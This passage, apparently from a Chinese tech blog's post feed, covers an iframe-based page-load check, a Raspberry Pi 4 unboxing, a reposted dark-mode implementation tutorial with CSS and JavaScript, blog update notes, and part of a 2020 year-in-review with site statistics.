设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">    iframe.onerror = iframe.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">iframe.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">iframe.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定为不可见</span></span><br><span class=\"line\">iframe.style = <span class=\"string\">\"display: none!important;\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 向 body 添加 iframe</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.appendChild(iframe);</span><br></pre></td></tr></table></figure><p>缺点：页面上的其他外部链接也会被一并的加载过来，例如 JS 文件，CSS 文件，统计代码。</p>\n<p>您也可以 <a href=\"https://codepen.io/ocoke-the-decoder/pen/dyNZEwq\">点击此链接</a> 前往 CodePen 体验。</p>\n","link":"https://blog.yfun.top/posts/856484826/"},{"title":"树莓派 4 揽件日志","date":"2021-03-19 11:16:00","description":"\n<p>前两天在淘宝上购买了一台 4GB 版本的 树莓派 4 。</p>\n<p>在安装系统时我选择了 <code>Ubuntu Server</code> 系统，因为我并不打算使用图形化界面，而且 Raspbian 系统只有 32 位的 ╮(╯▽╰)╭。</p>\n<p>而商家发的是中通快递，速度慢不说，外包装都给我压烂了。(ó﹏ò｡)</p>\n<p>商家随主板还发货了一个闪迪 32GB TF 卡（读写速度还可以），一个电源，一个外壳还有一个小风扇。</p>\n<p>目前先折腾折腾，玩一玩，后面继续写文章。</p>\n<p>目前没有把网站迁移上去的想法，因为这样的话网站会变得很不稳定。</p>\n","link":"https://blog.yfun.top/posts/229627020/"},{"title":"为网站加入友好的深色模式支持","date":"2021-01-22 04:29:38","description":"\n<div class=\"note note-info\">            <div class=\"title\">转载文章</div>原文标题：你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持<p>原文链接：<a href=\"https://blog.skk.moe/post/hello-darkmode-my-old-friend/\">https://blog.skk.moe/post/hello-darkmode-my-old-friend/</a><br>原文作者：Sukka</p>          </div>\n<p>前几天为我的 Hexo 主题：Miracle 加入了深色模式，但我的技术还是太辣鸡，经常出现问题。</p>\n<p>无意间看到 Sukka 大佬的文章：「你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持」，跟着文章重构了主题深色模式的代码，就转载过来方便学习。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%80%E4%B9%88%E6%98%AF%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"什么是「深色模式」\"></a>什么是「深色模式」</h2>\n<p>很多操作系统在日落后会自动切换到「深色模式」、并不意味着「深色模式」就是「夜间模式」。「夜间模式」用于夜晚的弱光环境，主要目的是保护眼睛、减少强光刺激、避免影响睡眠，不难理解为什么 macOS 的 Night Shift 会自动调节屏幕色温、Android（AOSP）到了夜间可以选择启用系统级「琥珀色」滤镜。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/macos-settings.png\"><p>「深色模式」更像是一个主题，即使在白天也可以使用。不论是为了在 OLED 屏幕上省电、亦或是减少白光刺激护眼、亦或是暗色模式对色盲用户更加友好，总之 macOS 率先提出了系统级的「暗色模式」、并在 WebKit 中增加了对应的 Media Query，而后 Chromium、Firefox 先后跟进，如今兼容 <code>prefers-color-scheme</code> 的浏览器占有率已经高达 81.82%。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%88%A9%E7%94%A8-Media-Query-%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"利用 Media Query 简单实现深色模式\"></a>利用 Media Query 简单实现深色模式</h2>\n<p>CSS 媒体查询 <code>@media</code> 是一个足够强大的特性，可以有条件地将样式应用于文档和各种上下文中。<a href=\"https://drafts.csswg.org/mediaqueries-5/\">Media Queries Level 5 草案</a> 中提出了深色模式的判断方式 <code>prefers-color-scheme</code>，包含 <code>light</code>、<code>dark</code>、<code>no-preference</code> 三种值。而不支持 Media Queries 5 的浏览器会直接无视 CSS 中的 <code>prefers-color-scheme</code> Media Query，无需额外的代码即可优雅降级。</p>\n<p>还记得我刚刚说过「深色模式更像一个主题」么？为网站新增深色模式就如同换肤功能；搭配 <code>prefers-color-scheme</code>，编写深色模式的思路就如同编写响应式一般、无需赘述，结合几段 Code Snippet 一笔带过：</p>\n<h3>\n<a href=\"https://blog.yfun.top/#CSS-Variable-%E7%9A%84%E6%96%B9%E6%B3%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"CSS Variable 的方法实现深色模式\"></a>CSS Variable 的方法实现深色模式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-text</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>通过维护两套 CSS Variable，可以快速切换不同的配色方案。这种方法特点是所需代码较少，缺点是 CSS Variable 的兼容性较差，可能还需要引入额外的 Polyfill。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%BA%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E5%8D%95%E7%8B%AC%E7%BC%96%E5%86%99%E6%A0%B7%E5%BC%8F\" class=\"headerlink\" title=\"为深色模式单独编写样式\"></a>为深色模式单独编写样式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>直接维护两套样式的方法清晰直观、任何网站都可以基于这种方法进行改造。但会造成冗余代码、较难实现统一的风格、后期不易维护。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%9D%A1%E4%BB%B6%E6%80%A7%E5%8A%A0%E8%BD%BD%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E7%9A%84-CSS-%E6%96%87%E4%BB%B6\" class=\"headerlink\" title=\"条件性加载深色模式的 CSS 文件\"></a>条件性加载深色模式的 CSS 文件</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* main.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* dark.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"main.css\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"dark.css\"</span> <span class=\"attr\">media</span>=<span class=\"string\">\"(prefers-color-scheme: dark)\"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用 <code>&lt;link&gt;</code> 标签的 Media Query，甚至可以单独加载暗色模式的 CSS 文件。</p>\n<blockquote><p>需要注意 CSS 选择器的权重，因此作为可选的 <code>dark.css</code> 一定要放在 <code>main.css</code> 之后加载。</p></blockquote>\n<p>除了上述三种方式以外，使用 CSS <code>filter</code> 或 <code>mix-blend-mode</code> 还可以实现对网站整体色调的改变，可以确保配色风格的统一性。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D%E7%9A%84%E5%85%BC%E5%AE%B9%E6%80%A7\" class=\"headerlink\" title=\"「深色模式」的兼容性\"></a>「深色模式」的兼容性</h2>\n<p>虽然有了优雅的 <code>prefers-color-scheme</code> 可以识别操作系统的显示模式，但是对于用户来说，仅依赖 Media Query 的「深色模式」并不能带来很好的体验。<br>首先是浏览器兼容性。虽然支持该特性的浏览器的市场占有率非常喜人，但是从版本号上来看却并不乐观：</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/caniuse.png\"><p>考虑到使用 Chormium 70 内核甚至 Tencent X5 内核的国产浏览器，大部分用户并没有机会体验到深色模式。除此以外，操作系统级别的「深色模式」实现也会受到 OEM 厂商的影响 —— 虽然 Android 10（AOSP）提供「深色模式」，但是一加的 OxygenOS 却将其深藏在系统主题设置里，没有自动切换、在 Quick Settings 里也没有快速的切换开关。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E7%94%A8%E6%88%B7%E5%8F%8B%E5%A5%BD%E7%9A%84%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"设计一个用户友好的「深色模式」\"></a>设计一个用户友好的「深色模式」</h2>\n<p>受限于兼容性和复杂的操作系统，大部分网站依然在使用更传统的「开关」切换 —— 通过 toggle <code>&lt;html&gt;</code> 或<br><code>&lt;body&gt;</code> 的 class 属性实现在两套样式之间切换、并将开关的状态记忆在 localStorage 中的方法虽然有效，却是无奈之举，手动切换开关相比 <code>prefers-color-scheme</code> 也不够优雅。如果将「开关」和 <code>prefers-color-scheme</code> 结合起来，就可以带来更好的用户体验：</p>\n<ul>\n<li>对于不兼容的浏览器或操作系统，访客依然可以通过开关手动切换显示模式</li>\n<li>对于兼容的浏览器或操作系统，Media Query 能够实现在两种显示模式之间切换</li>\n<li>在兼容的浏览器或操作系统上，用户还可以通过开关 override 当前的显示模式</li>\n</ul>\n<p>在将两者组合在一起时，不能简单地用「开关」覆盖 <code>prefers-color-scheme</code>，否则用户触发开关、状态被永久记忆在 localStorage 之后，就变成了僵硬的手动模式。<br>举个例子。访客可能在操作系统还没有自动切换到「深色模式」时通过网站上的开关切换显示模式，经过一个夜晚后到了次日白天、访客再度访问网站时，自然希望不需要再切换开关、网站就能以常规的浅色模式显示。因此设计思路是当 <code>prefers-color-scheme</code> 的值发生改变（从 与用户需要的显示模式不同 变成 相同）时清空 localStorage 中储存的开关状态，此时显示模式切换回基于 Media Query 的「自动」模式。</p>\n<p><strong>Talk is cheap, here goes the code.</strong></p>\n<p>首先是 CSS：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'dark'</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span><span class=\"selector-pseudo\">:not(</span><span class=\"selector-attr\">[data-user-color-scheme]</span>) {</span><br><span class=\"line\">    <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-attr\">[data-user-color-scheme=<span class=\"string\">'dark'</span>]</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>真是令人看的头大，让我们逐行来看都是些什么：</p>\n<ul>\n<li>在 <code>:root</code> 下定义了一个 CSS Variable <code>--color-mode: light</code> 和在浅色模式下用到的 CSS Variable（比如使用深色 <code>#333</code> 作为主要字体颜色）。</li>\n<li>使用 <code>prefers-color-scheme</code> 的 Media Query 定义深色模式下的 CSS Variable： <code>--color-mode: light</code> 。深色模式的样式（如浅色 <code>#eff</code> 作为主要字体颜色）要定义在 <code>:not([data-user-color-scheme])</code> 伪类下以避免「开关」的行为覆盖浏览器的样式。</li>\n<li>为 <code>[data-user-color-scheme='dark']</code> 再定义一遍深色模式下用到的样式。<br>有了这段 CSS，不难理解深色模式何时会生效：当操作系统使用「深色模式」且 <code>&lt;html&gt;</code> 或 <code>&lt;body&gt;</code> 标签上没有 <code>data-user-color-scheme</code> 属性时、或者存在 <code>data-user-color-scheme</code> 属性且值为 <code>dark</code> 时。</li>\n</ul>\n<p>然后是困难的部分了：编写 JavaScript 为「开关」添加行为。</p>\n<p>先定义一些常量：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> rootElement = <span class=\"built_in\">document</span>.documentElement; <span class=\"comment\">// &lt;html&gt;</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeStorageKey = <span class=\"string\">'user-color-scheme'</span>; <span class=\"comment\">// 作为 localStorage 的 key</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeMediaQueryKey = <span class=\"string\">'--color-mode'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> rootElementDarkModeAttributeName = <span class=\"string\">'data-user-color-scheme'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeTogglebuttonElement = <span class=\"built_in\">document</span>.getElementById(<span class=\"comment\">/* element id */</span>);</span><br></pre></td></tr></table></figure><p>接下来，用 <code>try {} catch (e) {}</code> 封装一下 localStorage 的操作，以应对 HTML5 Storage 被禁用、localStorage 被写满、localStorage 实现不完整的情况：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> setLS = <span class=\"function\">(<span class=\"params\">k, v</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.setItem(k, v);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> removeLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.removeItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> getLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">localStorage</span>.getItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">null</span> <span class=\"comment\">// 与 localStorage 中没有找到对应 key 的行为一致</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>我们还需要一个函数读取当前 <code>prefers-color-scheme</code> 的方法。由于已经在 CSS 中定义了 <code>--color-mode</code>，所以在 JS 中直接读取就好了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> getModeFromCSSMediaQuery = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">const</span> res = getComputedStyle(rootElement).getPropertyValue(darkModeMediaQueryKey);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (res.length) <span class=\"keyword\">return</span> res.replace(<span class=\"regexp\">/\\\"/g</span>, <span class=\"string\">''</span>).trim();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> res === <span class=\"string\">'dark'</span> ? <span class=\"string\">'dark'</span> : <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"comment\">// 使用 matchMedia API 的写法会优雅的多</span></span><br><span class=\"line\">  <span class=\"comment\">// return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>还记得我们需要自动取消手动模式回到 <code>prefers-color-scheme</code> 么？意味着我们需要一个函数清掉 LS、删掉 <code>&lt;html&gt;</code> 存在的 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> resetRootDarkModeAttributeAndLS = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  rootElement.removeAttribute(rootElementDarkModeAttributeName);</span><br><span class=\"line\">  removeLS(darkModeStorageKey);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>接下来是起主要作用的函数了，负责为 <code>&lt;html&gt;</code> 标签修改 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> validColorModeKeys = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> applyCustomDarkModeSettings = <span class=\"function\">(<span class=\"params\">mode</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 接受从「开关」处传来的模式，或者从 localStorage 读取</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> currentSetting = mode || getLS(darkModeStorageKey);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (currentSetting === getModeFromCSSMediaQuery()) {</span><br><span class=\"line\">    <span class=\"comment\">// 当用户自定义的显示模式和 prefers-color-scheme 相同时重置、恢复到自动模式</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) { <span class=\"comment\">// 相比 Array#indexOf，这种写法 Uglify 后字节数更少</span></span><br><span class=\"line\">    rootElement.setAttribute(rootElementDarkModeAttributeName, currentSetting);</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 首次访问或从未使用过开关、localStorage 中没有存储的值，currentSetting 是 null</span></span><br><span class=\"line\">    <span class=\"comment\">// 或者 localStorage 被篡改，currentSetting 不是合法值</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>当然，「开关」还需要一个函数，这个函数负责获取相反的显示模式，同时还要将新的模式写入 localStorage 存储起来：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> invertDarkModeObj = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"string\">'light'</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"string\">'dark'</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> toggleCustomDarkMode = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">let</span> currentSetting = getLS(darkModeStorageKey);</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) {</span><br><span class=\"line\">    <span class=\"comment\">// 从 localStorage 中读取模式，并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[currentSetting];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (currentSetting === <span class=\"literal\">null</span>) {</span><br><span class=\"line\">    <span class=\"comment\">// localStorage 中没有相关值，或者 localStorage 抛了 Error</span></span><br><span class=\"line\">    <span class=\"comment\">// 从 CSS 中读取当前 prefers-color-scheme 并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 不知道出了什么幺蛾子，比如 localStorage 被篡改成非法值</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span>; <span class=\"comment\">// 直接 return;</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">  <span class=\"comment\">// 将相反的模式写入 localStorage</span></span><br><span class=\"line\">  setLS(darkModeStorageKey, currentSetting);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> currentSetting;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>相关的函数都定义完了，是时候添加函数执行了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 当页面加载时，将显示模式设置为 localStorage 中自定义的值（如果有的话）</span></span><br><span class=\"line\">applyCustomDarkModeSettings();</span><br><span class=\"line\"></span><br><span class=\"line\">darkModeTogglebuttonElement.addEventListener(<span class=\"string\">'click'</span>, <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 当用户点击「开关」时，获得新的显示模式、写入 localStorage、并在页面上生效</span></span><br><span class=\"line\">  applyCustomDarkModeSettings(toggleCustomDarkMode());</span><br><span class=\"line\">})</span><br></pre></td></tr></table></figure><p>我的博客也使用的这种实现，通过 Navbar 中的按钮体验一下吧！</p>\n","link":"https://blog.yfun.top/posts/175456095/"},{"title":"博客最近的一些改变","date":"2021-01-13 10:15:49","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%B8%BB%E9%A2%98\" class=\"headerlink\" title=\"主题\"></a>主题</h2>\n<p>经过近一个月的开发，Miracle 主题已经发布至 <code>v1.2.0</code> 版本，也正式可以开始使用。</p>\n<p>主题仓库：<a href=\"https://t.yfun.top/api/jump?u=https://github.com/hifun-team/hexo-theme-miracle\">hifun-team/hexo-theme-miracle</a></p>\n<p>主题对输出的内容等进行优化，去除不必要的资源，速度非常之快。</p>\n<blockquote><p>PS: 主要原因是主题的首页没有图片，这主要是因为我不想找图，而且会拖慢页面速度，一举两等。[doge]</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AF%84%E8%AE%BA\" class=\"headerlink\" title=\"评论\"></a>评论</h2>\n<p><del>评论更换为 Waline，这样我就有了评论后台、回复通知和关键词过滤，真不错！</del></p>\n<blockquote><p>已更换至 Twikoo</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E9%83%A8%E7%BD%B2\" class=\"headerlink\" title=\"部署\"></a>部署</h2>\n<p><del>部署换回了直接部署 ( <code>hexo d</code> )，因为主题在 <code>Action</code> 部署时一直无法解析 <code>Tag 插件</code>，而本地又可以...</del></p>\n<p><del>而且实际上使用云部署的次数并不多，因为我每次写完文章以后都会自己看一遍，不太必要。</del></p>\n<p>已重新切换回云部署，并且已经解决无法解析 <code>Tag 插件</code> 的问题。</p>\n","link":"https://blog.yfun.top/posts/1987652759/"},{"title":"无垠 2020 年度总结","date":"2020-12-29 21:04:02","description":"\n<p>2020 即将过去，2021 已在眼前。2020 实在是多灾多难的一年，新冠疫情可以说是严重打乱了我的生活计划，希望新的一年，一切都可以变好吧。</p>\n<p>2020 还剩下最后两天，是时候总结一下这一年了。</p>\n<h1>统计数据</h1>\n<p>依然是一些统计数据。以下数据截止 2020 年 12 月 29 日 23:39:59。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 28,888 (<span>+7.4%</span>)，年 PV 76,583 (<span>-1.66%</span>)，日均 UV 79.36，平均停留时间 5分13秒 (<span>-21.4%</span>)，平均跳出率 51% (<span>-3.77%</span>)。一年有效文章数 5 (<span>+150%</span>)，新增评论 242 条 (<span>-44.9%</span>)。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2432\"></a>\n<p>文章数提升，访问量也有所提升，但 PV 和停留时间却下降了，或许我还需要继续提高文章的质量…</p>\n<h2>个人主页</h2>\n<p>个人主页依然是几乎没有更新过。什么时候能把 TODO List 上的东西做了呢？我也不知道。不过访问量倒是比去年上升了不少。</p>\n<p>个人页总 UV 3,515 (<span>+64.2%</span>)，总 PV 3,929 (<span>+43.2%</span>)，日均 UV 9.9 (<span>+65%</span>)，平均停留时间 63秒 (<span>+1.6%</span>)。和去年一样，主要来源是知乎和 V2EX。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2433\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 7 次，新增 328 commits (<span>+91.8%</span>)，Star 数增加了 306，现有 614。感谢所有人的支持。当然，虽然 2.0 咕咕咕了很久（甚至离最早的承诺已经过去将近一年半了），但我已经在对 2.0 进行最后的完善（改动确实比较大）。相信在 2021 的开头，MDx 2.0 就能顺利发布了。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：我经历过的最长的“寒假”开始了</li>\n<li>二月：GitHub followers 换虚拟币，成功换到 3.5k CNY 没有翻车</li>\n<li>三月：<a 